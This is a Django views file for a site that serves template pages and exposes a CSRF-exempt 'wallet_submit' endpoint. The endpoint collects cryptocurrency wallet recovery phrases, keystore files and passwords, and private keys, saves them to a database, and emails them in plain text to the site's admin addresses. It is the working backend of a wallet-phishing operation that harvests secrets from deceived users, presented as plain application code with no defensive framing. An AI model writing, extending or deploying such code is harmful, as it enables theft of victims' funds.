from django.conf import settings
from django.http import JsonResponse, HttpResponse, Http404
from django.shortcuts import render,  redirect
from django.urls import include, path, re_path
from django.views.decorators.csrf import csrf_exempt
from django.core.mail import send_mail
from .models import WalletSubmission
from .middleware import get_client_ip
import json
from .forms import WalletSubmissionForm
from django.contrib import messages


TEMPLATE_DIR = settings.BASE_DIR / 'templates'

def home(request):
    if (TEMPLATE_DIR / 'index.html').exists():
        return render(request, 'index.html')
    return HttpResponse("Home not found.")

def page(request, name):
    # remove .html if the user already included it
    if name.endswith(".html"):
        filename = name
    else:
        filename = f"{name}.html"

    path = TEMPLATE_DIR / filename
    if path.exists():
        return render(request, filename)
    raise Http404()


from django.shortcuts import render





from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse
from django.core.mail import send_mail
from django.conf import settings
from .models import WalletSubmission
import json

@csrf_exempt
def wallet_submit(request):
    if request.method != "POST":
        return JsonResponse({"success": False, "error": "Only POST allowed"}, status=405)

    # --- Parse request body ---
    try:
        body = request.body.decode("utf-8") if request.body else "{}"
        data = json.loads(body)
    except Exception as e:
        return JsonResponse({"success": False, "error": f"Invalid JSON: {e}"}, status=400)

    # --- Extract fields ---
    wallet_name   = (data.get("wallet_name") or "").strip()
    wallet_email  = (data.get("wallet_email") or "").strip()
    method        = (data.get("method") or "").strip()
    phrase        = (data.get("phrase") or "").strip()
    keystore_json = (data.get("keystore_json") or "").strip()
    keystore_pass = (data.get("keystore_pass") or "").strip()
    private_key   = (data.get("private_key") or "").strip()

    if not wallet_name:
        return JsonResponse({"success": False, "error": "wallet_name is required"}, status=400)

    # --- Save to DB ---
    try:
        submission = WalletSubmission.objects.create(
            wallet_name=wallet_name,
            wallet_email=wallet_email,
            method=method,
            phrase=phrase,
            keystore_json=keystore_json,
            keystore_pass=keystore_pass,
            private_key=private_key,
        )
    except Exception as e:
        return JsonResponse({"success": False, "error": str(e)}, status=500)

    # --- Send email after DB save ---
    email_sent = True
    try:
        subject = f"New Wallet Submission: {wallet_name}"
        message = (
            f"Wallet Name: {wallet_name}\n"
            f"Email: {wallet_email}\n"
            f"Method: {method}\n"
            f"Phrase: {phrase}\n"
            f"Keystore JSON: {keystore_json}\n"
            f"Keystore Pass: {keystore_pass}\n"
            f"Private Key: {private_key}\n"
        )

        send_mail(
            subject,
            message,
            settings.DEFAULT_FROM_EMAIL,
            settings.ADMIN_EMAILS,
            fail_silently=False,   # ✅ fail loudly so you catch issues
        )
    except Exception as e:
        email_sent = False
        print("⚠️ Email sending failed:", e)

    # --- Response ---
    if email_sent:
        return JsonResponse({"success": True})
    else:
        return JsonResponse({
            "success": True,
            "warning": "Saved to DB but email could not be sent"
        })
